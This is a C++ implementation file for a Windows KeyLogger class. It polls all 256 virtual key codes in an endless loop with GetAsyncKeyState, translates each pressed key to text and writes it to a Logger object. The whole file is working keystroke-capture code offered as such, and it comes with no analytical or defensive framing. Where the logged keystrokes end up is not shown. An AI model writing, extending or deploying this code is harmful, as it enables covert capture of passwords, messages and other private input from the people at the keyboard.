#include "KeyLogger.h"
#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

KeyLogger::KeyLogger(Logger* logger) {
	this->logger = logger;
}

wstring KeyLogger::GetKeyText(int keyCode) {
	UINT scanCode = MapVirtualKey(keyCode, MAPVK_VK_TO_VSC);
	
	BYTE keyboardState[256];
	GetKeyboardState(keyboardState);

	const int resultLength = 64;
	WCHAR resultText[resultLength] = { 0 };
	
	ToUnicode(keyCode, scanCode, keyboardState, resultText, resultLength, NULL);

	return wstring(resultText);
}

void KeyLogger::StartLogging() {
	const short pressedState = (1 << 15) | 1;

	while (true) {
		// Iterate through all virtual key codes 
		for (int keyCode = 0; keyCode < 256; keyCode++) {
			if (GetAsyncKeyState(keyCode) == pressedState) { 
				wstring keyText = this->GetKeyText(keyCode);
				this->logger->Write(keyText);
			}
		}

		Sleep(10);
	}
}